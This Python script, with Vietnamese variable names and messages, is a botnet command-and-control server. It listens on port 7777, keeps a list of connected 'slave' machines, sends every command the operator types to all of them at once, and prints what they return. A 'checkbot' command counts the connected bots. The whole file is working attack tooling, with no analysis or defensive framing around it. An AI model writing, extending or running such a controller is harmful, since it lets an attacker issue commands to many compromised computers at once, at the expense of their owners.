#!/usr/bin/env python3
import socket
import threading

danh_sach_khach = []

def xu_ly_khach(conn, dia_chi):
    print(f"[+] Đã kết nối: {dia_chi}")
    try:
        while True:
            du_lieu = conn.recv(4096)
            if not du_lieu:
                break
            print(f"[{dia_chi}] Kết quả:\n{du_lieu.decode()}")
    except:
        pass
    print(f"[-] Đã ngắt kết nối: {dia_chi}")
    try:
        danh_sach_khach.remove((conn, dia_chi))
    except:
        pass
    conn.close()

def gui_lenh(lenh):
    for conn, dia_chi in danh_sach_khach:
        try:
            conn.sendall(lenh.encode() + b"\n")
        except:
            pass

def nhap_lenh():
    while True:
        lenh = input("LENH> ").strip()
        if lenh == "":
            continue
        if lenh == "checkbot":
            print(f"[INFO] Đang có {len(danh_sach_khach)} slave kết nối:")
            for _, dia_chi in danh_sach_khach:
                print(f" - {dia_chi[0]}:{dia_chi[1]}")
            continue
        gui_lenh(lenh)

def main():
    may_chu = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    may_chu.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    may_chu.bind(('0.0.0.0', 7777))
    may_chu.listen()
    print("[*] Đang chờ kết nối trên cổng 7777 ...")

    threading.Thread(target=nhap_lenh, daemon=True).start()

    while True:
        conn, dia_chi = may_chu.accept()
        danh_sach_khach.append((conn, dia_chi))
        threading.Thread(target=xu_ly_khach, args=(conn, dia_chi), daemon=True).start()

if __name__ == "__main__":
    main()
